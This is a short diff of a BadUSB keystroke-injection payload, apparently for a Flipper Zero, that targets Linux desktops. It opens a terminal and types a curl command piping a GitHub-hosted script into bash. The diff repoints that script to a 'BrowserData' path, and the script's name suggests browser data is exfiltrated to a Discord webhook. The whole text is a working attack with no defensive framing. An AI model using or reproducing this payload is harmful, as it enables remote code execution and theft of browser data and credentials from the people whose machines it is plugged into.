@@ -8,5 +8,5 @@ REM     Target: GNOME, Xfce, MATE
 
 CTRL-ALT T
 DELAY 500
-STRING curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/discord_wh_linux.sh | bash
+STRING curl -sSL https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/discord_wh_linux.sh | bash
 ENTER
